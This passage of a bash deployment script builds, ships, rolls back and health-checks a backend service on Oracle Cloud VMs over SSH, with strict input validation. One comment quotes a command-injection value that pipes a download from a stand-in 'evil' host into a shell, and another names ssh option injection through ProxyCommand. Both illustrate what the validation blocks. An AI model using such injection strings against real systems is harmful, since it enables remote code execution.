#!/usr/bin/env bash
# Recognition service deploy automation for OCI.
#
# Wraps the build -> push -> ssh restart -> verify procedure documented in
# infra/oci/README.md into one command per environment, with pre-flight checks
# that catch the common foot-guns:
#   - docker daemon not running (local build mode)
#   - OCIR auth token missing/expired (local or remote)
#   - SSH key not loaded / public-IP allowlist drift
#   - HEAD diverged from origin/main (staging/prod only; skipped for dev + dev-fir)
#   - dirty working tree (warned for dev/dev-fir, blocked for staging/prod)
#
# Subcommands:
#   build          [tag]              Build :SHA + :tag locally (no push). tag default = dev.
#   build-remote   [tag]              Build immutable :SHA on the OCI VM (no local docker).
#   deploy <env>                      Build + push :SHA + :ENV_TAG + ssh restart + verify.
#                                       env = dev|dev-fir|staging|prod. 'deploy prod' requires CONFIRM=PROMOTE.
#                                       dev-fir shares the :dev image tag with dev (isolated runtime, same image).
#   promote <from> <to>               Retag :FROM_TAG -> :TO_TAG on OCIR + restart + verify.
#                                       e.g. promote dev staging, promote staging prod (CONFIRM=PROMOTE),
#                                       promote staging dev (rollback path; also rolls back dev-fir — shared :dev tag).
#   rollback <env> <id>                Restore registry/VM env tag from rollback-<12-char-digest-id>,
#                                       restart, and verify. prod requires CONFIRM=PROMOTE.
#   verify         <env>              GET /health and compare commit_sha to GIT_REF (default HEAD).
#                                       Retries up to ACX_VERIFY_ATTEMPTS times for warm-up. Fails closed.
#                                       Expected image repo prefers remote .env ACX_IMAGE_REPO (so
#                                       standalone verify of a VLM deploy works without re-exporting
#                                       ACX_BUILD_TARGET). After deploy/promote, ACX_VERIFY_OPTIONAL=1
#                                       downgrades a failed verify to a warning (does not exit).
#   status                            Snapshot /health for dev, dev-fir, staging, prod.
#   gpu-lifecycle                     Install and verify the acx-gpu-start/reap timers when
#                                       ACX_DEPLOY_GPU_LIFECYCLE=1. Requires ACX_GPU_READY_URL.
#   clear-image-repo <env>            Remove ACX_IMAGE_REPO from the remote env .env so compose falls
#                                       back to the recognition default (${OCIR}/.../acx-backend).
#                                       Use this to roll back sticky VLM/variant repo state after a
#                                       promote to recognition, or to undo a bad ship. Does not restart.
#   reset          <env>              Destructive: stop unit, clear env Postgres state, restart, verify
#                                       /ready, run post-reset bootstrap (tenant + api_key creation).
#                                       Requires CONFIRM_REMOTE_RESET=RESET and ACX_RESET_SITE_URL.
#                                       'reset prod' also requires CONFIRM=PROMOTE.
#
# Set REMOTE_BUILD=1 (or env ACX_REMOTE_BUILD=1) to make 'deploy' / 'promote' build/retag
# on the OCI VM via SSH+rsync instead of locally. Removes the colima/Docker-Desktop
# dependency entirely; build runs natively on linux/arm64 (no cross-compile).
#
# Environment overrides:
#   OCI_HOST                 default acx-backend.tail1a44b8.ts.net  (Tailscale MagicDNS)
#                              override to the public IP if the tailnet is unavailable
#   OCI_USER                 default ubuntu
#   OCIR_REGISTRY            default iad.ocir.io
#   OCIR_NAMESPACE           default idu2kqqe2jxy
#   IMAGE_NAME               default acx-backend
#   GIT_REF                  default HEAD
#   ACX_DEPLOY_PLATFORM      default linux/arm64 (matches A1 Always Free shape; ignored in remote-build)
#   ACX_REMOTE_BUILD         set to 1 to build on the VM instead of locally
#   ACX_REMOTE_BUILD_DIR     default /tmp/acx-build  (rsync target on the VM)
#   ACX_REMOTE_BUILDER_NAME  default acx-deploy-builder-v1 (stable docker-container builder)
#   ACX_REMOTE_BUILDER_NODE  default acx-deploy-builder-v1-node (single explicit node)
#   ACX_REMOTE_BUILDER_ENDPOINT
#                            default unix:///var/run/docker.sock; other endpoints are refused
#   ACX_ALLOW_DIRTY          set to 1 to skip dirty-tree check (dev and dev-fir only)
#   ACX_VERIFY_ATTEMPTS      default 5  (post-deploy verify retry count for warm-up)
#   ACX_VERIFY_SLEEP         default 5  (seconds between verify attempts)
#   ACX_VERIFY_OPTIONAL      set to 1 to downgrade verify failure from fail to warn after deploy/promote
#   ACX_DEPLOY_GPU_LIFECYCLE default 0: explicit gpu-lifecycle exits 2 unless set to 1
#   ACX_GPU_READY_URL        required when ACX_DEPLOY_GPU_LIFECYCLE=1; no production default
#   ACX_GPU_LIFECYCLE_DRY_RUN set to 1 to render the installer plan without ssh/scp
#   ACX_CONVERGE_RUNTIME     default 1: 'deploy' converges the deployed compose+unit with the repo
#                              before restart. Set 0 for an image-only hotfix restart. Use
#                              'deploy <env> --check' for a read-only drift report (no mutation).
#   ACX_BOOT_SMOKE           default 1: 'deploy' boots the freshly-built :SHA in a throwaway
#                              container (import smoke + /health probe) before promoting/restarting,
#                              aborting on failure with prod untouched. Set 0 to bypass.
#   ACX_EDGE_APPLY           default 0: when the shared Caddy edge has drifted, behaviour is
#                              env-scoped — dev-fir fails closed (the edge IS fir's ingress);
#                              any other env warns and skips edge convergence so that env's
#                              own runtime still converges. Set 1 to explicitly allow the
#                              edge ship + reload/recreate from any env (applying may
#                              reload/recreate the prod-serving edge).
#   ACX_BUILD_TARGET         optional docker build --target (e.g. runtime-vlm). Empty = last stage
#                              (runtime). Charset-validated: ^[A-Za-z0-9_.-]+$ (empty allowed). Rejected
#                              values never reach ssh/shell interpolation (D1). Remote builds select a
#                              larger free-space floor for any target matching *vlm* (runtime-vlm,
#                              builder-vlm, …) before multi-GB torch layers are downloaded. Also selects
#                              the image repository name (RA-07):
#                              empty/runtime → IMAGE_NAME (default acx-backend); runtime-vlm →
#                              IMAGE_NAME-vlm. That same name is exported as ACX_IMAGE_REPO for compose.
#   ACX_IMAGE_VARIANT        optional variant label (recognition|vlm). Folded into resolve_image_repo_name
#                              and FAIL-CLOSED: ACX_IMAGE_VARIANT=vlm is refused unless ACX_BUILD_TARGET
#                              matches *vlm*. Sibling lane bakes /app/.image-variant inside the image.
#   ACX_SMOKE_TIMEOUT        positive integer seconds for Gate 2 /health budget (do_boot_smoke).
#                              Default 24 for recognition; longer UNVALIDATED default (120s) when the
#                              VLM target/variant is selected. Override this env var to raise the
#                              budget; replace the default once a real arm64 VLM smoke is measured.
#   ACX_PUSH_TIMEOUT         positive integer wall-clock seconds for each registry push (default 900).
#   ACX_PULL_TIMEOUT         positive integer wall-clock seconds for each registry pull (default 900).
#   ACX_REMOTE_COMMAND_TIMEOUT positive integer wall-clock seconds for ordinary remote calls (default 120).
#   ACX_EVIDENCE_TIMEOUT     positive integer wall-clock seconds for capture_failure_evidence
#                              probes (default 30). Decoupled from ACX_REMOTE_COMMAND_TIMEOUT so
#                              raising the pull/restart knob does not stretch the pre-rollback
#                              outage window.
#   ACX_REMOTE_BUILD_TIMEOUT positive integer wall-clock seconds for remote rsync/BuildKit setup,
#                              bootstrap, prune, and build work (default 1800; one shared budget).
#   CONFIRM                  required for prod actions: CONFIRM=PROMOTE (applies to deploy prod and promote * prod)
#
# Image variants / rollback (RA-07):
#   Build targets produce distinct repository names so variants never clobber each other:
#     empty / runtime  →  ${OCIR}/${NS}/${IMAGE_NAME}       (default acx-backend)
#     runtime-vlm      →  ${OCIR}/${NS}/${IMAGE_NAME}-vlm   (default acx-backend-vlm)
#   Greppable from the host alone:  docker images | grep -E 'acx-backend(-vlm)?'
#   Identify a running container's variant (Dockerfile ENV, owned by ol01-img):
#     docker inspect <container> --format '{{range .Config.Env}}{{println .}}{{end}}' \
#       | grep '^ACX_IMAGE_VARIANT='
#     # recognition → ACX_IMAGE_VARIANT=recognition ; VLM → ACX_IMAGE_VARIANT=vlm
#   Rollback TO that variant's previous tag:
#     recognition:  ${OCIR}/.../acx-backend:rollback-<id>  (or :staging / :latest)
#     VLM:          ${OCIR}/.../acx-backend-vlm:rollback-<id>  (set ACX_BUILD_TARGET=runtime-vlm
#                   so this script's IMAGE_BASE resolves to the -vlm repository)
#   Sticky ACX_IMAGE_REPO on the VM drives compose forever once shipped. To reset back to the
#   compose recognition default (remove the key from remote .env):
#     $0 clear-image-repo <env>
#     # or: make deploy-clear-image-repo ENV=<env>
#
# Reset-specific environment overrides (see do_reset()):
#   ACX_RESET_SITE_URL       REQUIRED for reset. WordPress site URL the plugin will hit
#                              (e.g. http://localhost:10010 for LocalWP). The bootstrap derives the
#                              per-site tenant UUID from this value via
#                              scripts/deploy/_derive_tenant_id.py (mirror of
#                              TenantIdentity::derive_from_site_url()). If the URL does
#                              not match the plugin's site URL, recognition requests fail
#                              with 403 tenant mismatch.
#   ACX_RESET_TENANT_ID      Optional explicit override. Skips per-site derivation; rare.
#   ACX_RESET_DRY_RUN        set to 1 to print the reset plan and exit without executing.
#   CONFIRM_REMOTE_RESET     required for reset: CONFIRM_REMOTE_RESET=RESET (fail-closed gate).
set -euo pipefail

OCI_HOST="${OCI_HOST:-acx-backend.tail1a44b8.ts.net}"
OCI_USER="${OCI_USER:-ubuntu}"
OCIR_REGISTRY="${OCIR_REGISTRY:-iad.ocir.io}"
OCIR_NAMESPACE="${OCIR_NAMESPACE:-idu2kqqe2jxy}"
IMAGE_NAME="${IMAGE_NAME:-acx-backend}"
GIT_REF="${GIT_REF:-HEAD}"
PLATFORM="${ACX_DEPLOY_PLATFORM:-linux/arm64}"
REMOTE_BUILD="${REMOTE_BUILD:-${ACX_REMOTE_BUILD:-0}}"
REMOTE_BUILD_DIR="${ACX_REMOTE_BUILD_DIR:-/tmp/acx-build}"
REMOTE_BUILDER_NAME="${ACX_REMOTE_BUILDER_NAME:-acx-deploy-builder-v1}"
REMOTE_BUILDER_NODE="${ACX_REMOTE_BUILDER_NODE:-acx-deploy-builder-v1-node}"
REMOTE_BUILDER_ENDPOINT="${ACX_REMOTE_BUILDER_ENDPOINT:-unix:///var/run/docker.sock}"
REMOTE_BUILD_LOCK="${REMOTE_BUILD_DIR}.lock"
# Optional docker build --target. Empty means BuildKit's default (last stage = runtime).
# This is the plumbing the script would pass as `docker build --target ...`; there was no
# prior target notion in this file — introduce it only as the explicit opt-in for VLM/etc.
# Case-normalised at ingestion (D8); Docker --target match is case-insensitive so mixed-case targets
# take the same variant-aware remote free-space gate.
ACX_BUILD_TARGET="${ACX_BUILD_TARGET:-}"
ACX_IMAGE_VARIANT="${ACX_IMAGE_VARIANT:-}"
# Lower-case once at ingestion so enum + D8 + remote free-space selection see a single form.
ACX_BUILD_TARGET="$(printf '%s' "${ACX_BUILD_TARGET}" | tr '[:upper:]' '[:lower:]')"
ACX_IMAGE_VARIANT="$(printf '%s' "${ACX_IMAGE_VARIANT}" | tr '[:upper:]' '[:lower:]')"

# Pre-build free-space floor on the remote docker data root (GB).
# Justification (not a round guess): torch-free recognition image is ~1.1GB today; a single
# remote build leaves multi-GB BuildKit intermediate layers; README/OPS-1 already document
# disk fill on the Always Free A1. Budget = ~2× image + ~4GB cache headroom + ~2GB for
# concurrent container layers/logs ≈ 8GB.
REMOTE_BUILD_MIN_FREE_GB=8
# Measured runtime-vlm build: 3.56GB image + ~12.9GB BuildKit cache + ~7.5GB headroom = 24GB.
REMOTE_VLM_BUILD_MIN_FREE_GB=24

# Boot-smoke Gate 2 /health budget defaults (seconds). Recognition keeps the
# historical 24s health budget sized for the ~1.1GB torch-free image on 4-core
# Ampere A1. Postgres pull/ready is budgeted separately so the pg_isready wait
# cannot consume the /health deadline. Health attempts skip the last sleep and
# reserve one poll interval for last-body + docker logs (EXIT trap) so a
# deadline kill still emits the 503 body.
# VLM default is an UNMEASURED estimate — no VLM image has ever been built or booted in
# this repo; replace with a measured figure once a real smoke run exists.
SMOKE_TIMEOUT_DEFAULT=24
SMOKE_TIMEOUT_VLM_DEFAULT=120
SMOKE_PG_READY_TIMEOUT=30
# Wall-clock slack for network create + two docker runs + port publish, outside
# the pg ready-wait and /health budgets. Pre-pull of pgvector is a separate
# run_with_deadline so image fetch cannot steal those budgets.
SMOKE_SETUP_SLACK=30

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/../.." && pwd)"
# OCIR credential resolution (Vault-backed, OCIRV-1). Sourced rather than
# inlined so scripts/deploy/tests/test-ocir-auth.sh can pin its invariants.
# shellcheck source=lib/ocir-auth.sh
source "${SCRIPT_DIR}/lib/ocir-auth.sh"
# shellcheck source=lib/bounded-remote-build.sh
source "${SCRIPT_DIR}/lib/bounded-remote-build.sh"
SERVICE_DIR="${REPO_ROOT}/apps/prototype-description-service"
# Display label only. Live ssh invocations use `-l "${OCI_USER}" -- "${OCI_HOST}"`
# so a leading-dash identity can never be parsed as an ssh option (S2-A-12).
SSH_TARGET="${OCI_USER}@${OCI_HOST}"

GREEN=$'\033[0;32m'
YELLOW=$'\033[0;33m'
RED=$'\033[0;31m'
RESET=$'\033[0m'

log()  { printf '%s==>%s %s\n' "${GREEN}" "${RESET}" "$*"; }
warn() { printf '%s!!%s %s\n'  "${YELLOW}" "${RESET}" "$*" >&2; }
fail() { printf '%sxx%s %s\n'  "${RED}"    "${RESET}" "$*" >&2; exit 1; }

# A deploy/login owns one private Docker credential directory for its complete
# lifetime. The path remains a shell-local value: only the exact Docker/login
# subprocesses that need registry credentials receive it in their environment.
ACX_DEPLOY_OCIR_CONFIG_DIR=""
ACX_DEPLOY_OCIR_REMOTE_CONFIG=0
ACX_DEPLOY_OCIR_REMOTE_AUTHENTICATED=0
ACX_CANDIDATE_DIGEST_REF=""
ACX_ROLLBACK_DIGEST_REF=""
ACX_ROLLBACK_IMAGE_BASE=""
ACX_ROLLBACK_TAG=""
ACX_RESTART_EVIDENCE_PHASE=""

# Quote one argument for the remote bash command string.  OpenSSH concatenates
# argv into a command string, so passing a local argv element is not itself a
# quoting boundary.  Every caller-controlled value in a remote command goes
# through this helper after its own semantic validation.
remote_quote() {
  printf '%q' "$1"
}

validate_deploy_tmpdir() {
  local value="${TMPDIR:-/tmp}"
  if [[ "${value}" != /* || ! -d "${value}" || ! "${value}" =~ ^/[A-Za-z0-9_./-]+$ ]]; then
    fail "TMPDIR must be an existing absolute directory using only [A-Za-z0-9_./-]; refusing unsafe value: ${value}"
  fi
}
validate_deploy_tmpdir

cleanup_deploy_ocir_docker_config() {
  local rc=$? config_dir="${ACX_DEPLOY_OCIR_CONFIG_DIR:-}" config_q
  trap - EXIT HUP INT TERM
  if [[ -n "${config_dir}" ]]; then
    if [[ "${ACX_DEPLOY_OCIR_REMOTE_CONFIG:-0}" == "1" ]]; then
      config_q="$(remote_quote "${config_dir}")"
      if ! ssh -o BatchMode=yes -o ConnectTimeout=5 -o ConnectionAttempts=1 \
        -o ServerAliveInterval=2 -o ServerAliveCountMax=2 \
        -l "${OCI_USER}" -- "${OCI_HOST}" \
        "rm -rf -- ${config_q}" >/dev/null; then
        warn "Remote OCIR credential cleanup failed for ${config_dir}; the remote expiry reaper remains armed"
      fi
    fi
    rm -rf -- "${config_dir}"
  fi
  ACX_DEPLOY_OCIR_CONFIG_DIR=""
  ACX_DEPLOY_OCIR_REMOTE_CONFIG=0
  ACX_DEPLOY_OCIR_REMOTE_AUTHENTICATED=0
  unset ACX_OCIR_DOCKER_CONFIG_DIR DOCKER_CONFIG
  return "${rc}"
}

init_deploy_ocir_docker_config() {
  if [[ -n "${ACX_DEPLOY_OCIR_CONFIG_DIR}" ]]; then
    return 0
  fi
  validate_deploy_tmpdir
  ACX_DEPLOY_OCIR_CONFIG_DIR="$(mktemp -d "${TMPDIR:-/tmp}/acx-ocir-deploy.XXXXXX")" \
    || fail "Could not create the deploy-scoped Docker credential directory"
  ACX_OCIR_DOCKER_CONFIG_DIR="${ACX_DEPLOY_OCIR_CONFIG_DIR}"
  DOCKER_CONFIG="${ACX_DEPLOY_OCIR_CONFIG_DIR}"
  trap cleanup_deploy_ocir_docker_config EXIT
  trap 'exit 129' HUP
  trap 'exit 130' INT
  trap 'exit 143' TERM
}

init_remote_ocir_docker_config() {
  init_deploy_ocir_docker_config
  if [[ "${ACX_DEPLOY_OCIR_REMOTE_CONFIG}" == "1" ]]; then
    return 0
  fi
  # Arm cleanup before the create attempt: ssh may create the directory and
  # still return non-zero (for example, if a following chmod fails).
  local config_q ttl ttl_q
  ttl="${ACX_OCIR_REMOTE_CONFIG_TTL:-3600}"
  if [[ ! "${ttl}" =~ ^[1-9][0-9]*$ ]]; then
    fail "ACX_OCIR_REMOTE_CONFIG_TTL must be a positive integer (got: ${ttl})"
  fi
  config_q="$(remote_quote "${ACX_DEPLOY_OCIR_CONFIG_DIR}")"
  ttl_q="$(remote_quote "${ttl}")"
  ACX_DEPLOY_OCIR_REMOTE_CONFIG=1
  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" \
    "umask 077; config=${config_q}; if [ ! -d \"\$config\" ]; then mkdir -p -- \"\$config\"; fi; chmod 700 \"\$config\"; nohup bash -c 'sleep \"\$1\"; rm -rf -- \"\$2\"' acx-ocir-reaper ${ttl_q} \"\$config\" >/dev/null 2>&1 </dev/null &"; then
    fail "Could not create remote deploy-scoped Docker credential directory on ${SSH_TARGET}"
  fi
}

# D1: refuse shell/ssh metacharacters before any remote interpolation. Quoting is not enough —
# a value like x';curl evil|sh;' closes a single-quoted ssh fragment and runs as ubuntu on the VM.
# Allowlist: empty OR ^[A-Za-z0-9_./-]+$ (docker target / tag / short name / remote path safe set).
# `/` is path-safe (not a shell metacharacter) so ACX_REMOTE_BUILD_DIR can share this gate.
assert_safe_shell_token() {
  local name="$1" value="$2"
  if [[ -z "${value}" ]]; then
    return 0
  fi
  if [[ ! "${value}" =~ ^[A-Za-z0-9_./-]+$ ]]; then
    fail "${name} failed charset validation (allowed: empty or [A-Za-z0-9_./-]+); refusing value that could reach a remote shell: ${value}"
  fi
}

# S2-A-12: OCI_USER / OCI_HOST reach ssh argv. Leading '-' would be parsed as an option
# (e.g. -oProxyCommand=…). Charset allowlist alone is not enough because '-' is admitted;
# refuse leading dash and require a non-empty host/user.
assert_safe_ssh_identity() {
  local name="$1" value="$2"
  if [[ -z "${value}" ]]; then
    fail "${name} must not be empty"
  fi
  if [[ "${value}" == -* ]]; then
    fail "${name} must not start with '-' (ssh option injection): ${value}"
  fi
  if [[ ! "${value}" =~ ^[A-Za-z0-9_.:-]+$ ]]; then
    fail "${name} failed charset validation (allowed: [A-Za-z0-9_.:-]+); refusing: ${value}"
  fi
}
assert_safe_ssh_identity "OCI_USER" "${OCI_USER}"
assert_safe_ssh_identity "OCI_HOST" "${OCI_HOST}"

# Full OCIR image repository path (registry/ns/name). No spaces, quotes, or shell metacharacters.
assert_safe_image_repo() {
  local name="$1" value="$2"
  if [[ -z "${value}" ]]; then
    fail "${name} must not be empty"
  fi
  if [[ ! "${value}" =~ ^[A-Za-z0-9_.:/-]+$ ]]; then
    fail "${name} failed charset validation (allowed: [A-Za-z0-9_.:/-]+); refusing: ${value}"
  fi
}

assert_safe_image_ref() {
  local name="$1" value="$2"
  if [[ -z "${value}" || ! "${value}" =~ ^[A-Za-z0-9_.:/@-]+$ ]]; then
    fail "${name} failed charset validation (allowed: [A-Za-z0-9_.:/@-]+); refusing: ${value:-empty}"
  fi
}

# Reset-path site URL: allow typical URL charset; refuse shell metacharacters (;`$| etc.).
# Regex must live in a variable: `#` would start a comment if written inline in [[ ]].
assert_safe_reset_site_url() {
  local value="$1"
  local re='^[A-Za-z0-9_.:/@%?=&#+-]+$'
  if [[ -z "${value}" ]]; then
    fail "ACX_RESET_SITE_URL must not be empty"
  fi
  if [[ ! "${value}" =~ $re ]]; then
    fail "ACX_RESET_SITE_URL failed charset validation (URL charset only); refusing value that could reach a remote shell: ${value}"
  fi
}

# Validate operator-facing tokens at ingestion (before resolve / IMAGE_BASE / any ssh).
assert_safe_shell_token "IMAGE_NAME" "${IMAGE_NAME}"
assert_safe_shell_token "OCIR_NAMESPACE" "${OCIR_NAMESPACE}"
assert_safe_shell_token "OCIR_REGISTRY" "${OCIR_REGISTRY}"
assert_safe_shell_token "ACX_BUILD_TARGET" "${ACX_BUILD_TARGET}"
assert_safe_shell_token "ACX_IMAGE_VARIANT" "${ACX_IMAGE_VARIANT}"
if [[ ! "${REMOTE_BUILDER_NAME}" =~ ^[A-Za-z0-9_.-]+$ || "${REMOTE_BUILDER_NAME}" == -* ]]; then
  fail "ACX_REMOTE_BUILDER_NAME must be a non-leading-dash [A-Za-z0-9_.-] token (got: ${REMOTE_BUILDER_NAME})"
fi
if [[ ! "${REMOTE_BUILDER_NODE}" =~ ^[A-Za-z0-9_.-]+$ || "${REMOTE_BUILDER_NODE}" == -* ]]; then
  fail "ACX_REMOTE_BUILDER_NODE must be a non-leading-dash [A-Za-z0-9_.-] token (got: ${REMOTE_BUILDER_NODE})"
fi
if [[ "${REMOTE_BUILDER_ENDPOINT}" != "unix:///var/run/docker.sock" ]]; then
  fail "ACX_REMOTE_BUILDER_ENDPOINT must be unix:///var/run/docker.sock; refusing an unverified endpoint"
fi
# D1: REMOTE_BUILD_DIR is interpolated into ssh remote command strings — same sink class as
# ACX_BUILD_TARGET. Empty is refused (operator override of "" would otherwise skip the default).
if [[ -z "${REMOTE_BUILD_DIR}" ]]; then
  fail "ACX_REMOTE_BUILD_DIR must not be empty"
fi
assert_safe_shell_token "ACX_REMOTE_BUILD_DIR" "${REMOTE_BUILD_DIR}"

# D8: explicit allowed-value enums (case already folded lower above). Anything else fails closed —
# including `vlm2`, `bogus`, and previously-accepted freeform targets that could overwrite tags.
assert_allowed_build_target() {
  case "${ACX_BUILD_TARGET}" in
    ""|runtime|runtime-vlm|builder|builder-vlm|runtime-base|uv) ;;
    *)
      fail "ACX_BUILD_TARGET must be one of: empty, runtime, runtime-vlm, builder, builder-vlm, runtime-base, uv (got: ${ACX_BUILD_TARGET})"
      ;;
  esac
}
assert_allowed_image_variant() {
  case "${ACX_IMAGE_VARIANT}" in
    ""|recognition|vlm) ;;
    *)
      fail "ACX_IMAGE_VARIANT must be one of: empty, recognition, vlm (got: ${ACX_IMAGE_VARIANT})"
      ;;
  esac
}
assert_allowed_build_target
assert_allowed_image_variant

# RA-07: derive repository name from ACX_BUILD_TARGET (+ ACX_IMAGE_VARIANT) so VLM and
# recognition never share tags. Empty target keeps the historical IMAGE_NAME (default
# acx-backend). runtime-vlm appends -vlm.
# D8 (build half): ACX_IMAGE_VARIANT=vlm is FAIL-CLOSED unless ACX_BUILD_TARGET matches *vlm*.
resolve_image_repo_name() {
  local target="${ACX_BUILD_TARGET:-}"
  local variant="${ACX_IMAGE_VARIANT:-}"
  if [[ "${variant}" == "vlm" && "${target}" != *vlm* ]]; then
    fail "ACX_IMAGE_VARIANT=vlm requires ACX_BUILD_TARGET matching *vlm* (got: ${target:-empty}); refusing fail-open variant/repo split"
  fi
  case "${target}" in
    ""|runtime|runtime-base|builder|uv) printf '%s\n' "${IMAGE_NAME}" ;;
    runtime-vlm|builder-vlm) printf '%s-vlm\n' "${IMAGE_NAME}" ;;
    *)
      # Enum above should make this unreachable; fail closed rather than invent a repo suffix.
      fail "ACX_BUILD_TARGET=${target} is not mapped to an image repository (internal enum drift)"
      ;;
  esac
}
IMAGE_BASE="${OCIR_REGISTRY}/${OCIR_NAMESPACE}/$(resolve_image_repo_name)"
# Compose image repo — same resolve_image_repo_name() result as build/push (one source of truth).
# Shipped into the remote env .env so docker-compose.env.yml / .prod.yml pull the variant repo.
# Operator may pre-set ACX_IMAGE_REPO only if it already matches resolve (no silent override).
if [[ -n "${ACX_IMAGE_REPO:-}" && "${ACX_IMAGE_REPO}" != "${IMAGE_BASE}" ]]; then
  assert_safe_image_repo "ACX_IMAGE_REPO" "${ACX_IMAGE_REPO}"
  warn "ACX_IMAGE_REPO was pre-set (${ACX_IMAGE_REPO}); using resolve result ${IMAGE_BASE} as authority"
fi
ACX_IMAGE_REPO="${IMAGE_BASE}"
assert_safe_image_repo "ACX_IMAGE_REPO" "${ACX_IMAGE_REPO}"
export ACX_IMAGE_REPO

# True when the selected target/variant is torch-bearing VLM (budget is unvalidated).
is_vlm_smoke_budget() {
  [[ "${ACX_BUILD_TARGET:-}" == *vlm* || "${ACX_IMAGE_VARIANT:-}" == "vlm" ]]
}

# Positive-integer validation for ACX_SMOKE_TIMEOUT (rg-008: fail fast at read time).
# Defaults are image-aware; operator override must still be a positive integer.
resolve_smoke_timeout() {
  local default raw
  if is_vlm_smoke_budget; then
    default="${SMOKE_TIMEOUT_VLM_DEFAULT}"
  else
    default="${SMOKE_TIMEOUT_DEFAULT}"
  fi
  raw="${ACX_SMOKE_TIMEOUT:-${default}}"
  if ! [[ "${raw}" =~ ^[1-9][0-9]*$ ]]; then
    fail "ACX_SMOKE_TIMEOUT must be a positive integer (got: ${raw})"
  fi
  printf '%s\n' "${raw}"
}

# Select the remote docker data-root floor from the normalized build target. Match *vlm* rather
# than only runtime-vlm because builder-vlm also downloads the torch-bearing extra.
remote_build_min_free_gb() {
  if [[ "${ACX_BUILD_TARGET:-}" == *vlm* ]]; then
    printf '%s\n' "${REMOTE_VLM_BUILD_MIN_FREE_GB}"
  else
    printf '%s\n' "${REMOTE_BUILD_MIN_FREE_GB}"
  fi
}

# Assert the remote docker data root has enough free space for the selected build variant.
assert_remote_build_free_space() {
  local target min_gb avail_gb observed_gb timeout rc=0
  target="${ACX_BUILD_TARGET:-empty}"
  min_gb="$(remote_build_min_free_gb)"
  if [[ -n "${1:-}" ]]; then
    timeout="${1}"
    if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
      fail "remote free-space probe timeout must be a positive integer (got: ${timeout})"
    fi
  else
    timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
  fi
  # df -BG prints e.g. "12G"; strip the unit. DockerRootDir is the volume that fills
  # with BuildKit cache (OPS-1), not the rsync temp dir.
  avail_gb="$(run_with_deadline "${timeout}" "remote docker free-space probe" \
    ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" \
      'root="$(docker info -f "{{.DockerRootDir}}" 2>/dev/null || echo /var/lib/docker)"; df -BG "$root" | awk "NR==2 {gsub(/G/,\"\",\$4); print \$4}"')" || rc=$?
  if (( rc != 0 )) || ! [[ "${avail_gb}" =~ ^[0-9]+$ ]]; then
    observed_gb="${avail_gb:-unknown}"
    fail "Remote build target ${target} needs at least ${min_gb}GB free on ${SSH_TARGET} docker data root; observed ${observed_gb} (free-space probe failed)"
  fi
  if (( avail_gb < min_gb )); then
    fail "Remote build target ${target} needs at least ${min_gb}GB free on ${SSH_TARGET} docker data root; observed ${avail_gb}GB (prune BuildKit cache or free disk)"
  fi
  log "Remote free space OK: ${avail_gb}GB available (need ${min_gb}GB)"
}

# A-11 / S2-A-09: any path that materialises image layers on the VM (pull/promote/
# boot-smoke) must consult the same free-space floor as remote build. VLM/torch
# images are multi-GB; recognition pulls are smaller but still share the floor
# when ACX_ENFORCE_DISK_ON_PULL=1. Default: enforce for VLM targets only so
# hermetic boot-smoke tests with fake ssh are unaffected.
assert_remote_disk_headroom_for_pull() {
  if is_vlm_smoke_budget || [[ "${ACX_ENFORCE_DISK_ON_PULL:-0}" == "1" ]]; then
    assert_remote_build_free_space
  fi
}

#---------------------------------------------------------------- env mapping
env_to_tag() {
  case "$1" in
    dev|dev-fir) echo "dev" ;;
    staging)     echo "staging" ;;
    prod)        echo "latest" ;;
    *)           fail "Unknown env: $1 (expected dev|dev-fir|staging|prod)" ;;
  esac
}
env_to_unit() {
  case "$1" in
    dev)     echo "acx-dev" ;;
    dev-fir) echo "acx-dev-fir" ;;
    staging) echo "acx-staging" ;;
    prod)    echo "acx-prod" ;;
    *) fail "Unknown env: $1" ;;
  esac
}
env_to_remote_dir() {
  case "$1" in
    dev)     echo "/opt/acx-backend/dev" ;;
    dev-fir) echo "/opt/acx-backend/dev-fir" ;;
    staging) echo "/opt/acx-backend/staging" ;;
    prod)    echo "/opt/acx-backend/prod" ;;
    *) fail "Unknown env: $1" ;;
  esac
}
env_to_health_url() {
  case "$1" in
    dev)     echo "https://dev.api.altcontext.com/health" ;;
    dev-fir) echo "https://fir.dev.api.altcontext.com/health" ;;
    staging) echo "https://staging.api.altcontext.com/health" ;;
    prod)    echo "https://api.altcontext.com/health" ;;
    *) fail "Unknown env: $1" ;;
  esac
}
env_to_ready_url() {
  case "$1" in
    dev)     echo "https://dev.api.altcontext.com/ready" ;;
    dev-fir) echo "https://fir.dev.api.altcontext.com/ready" ;;
    staging) echo "https://staging.api.altcontext.com/ready" ;;
    prod)    echo "https://api.altcontext.com/ready" ;;
    *) fail "Unknown env: $1" ;;
  esac
}

#---------------------------------------------------------------- pre-flight
preflight_docker() {
  command -v docker >/dev/null 2>&1 || fail "docker not found in PATH"
  docker info >/dev/null 2>&1 || fail "docker daemon not running (start colima with \`colima start\`, or start Docker Desktop)"
}

# Authentication tools are upstream trust boundaries: their stderr can contain
# terminal-active bytes or lines that resemble this script's own status output.
# Keep ordinary text useful for diagnosis, but strip C0/C1 controls and prefix
# every line so captured output cannot masquerade as a deploy decision.
sanitize_deploy_diagnostic() {
  # WHY: printf -v keeps SOH out of declare -f; tr no longer strips UTF-8 continuation bytes.
  local _soh _sk _ek _hdr
  printf -v _soh '\001'
  _sk='token|access_token|refresh_token|password|passwd|secret|api[-_]?key|[A-Za-z0-9_]*_token|[A-Za-z0-9_]*_password|[A-Za-z0-9_]*_secret|[A-Za-z0-9_]*_key_id|[A-Za-z0-9_]*_key_content|[A-Za-z0-9_]*_access_key|secret_key_base|[A-Za-z0-9_]*_key|pgpassword|identitytoken|pass_phrase|auth|_auth'
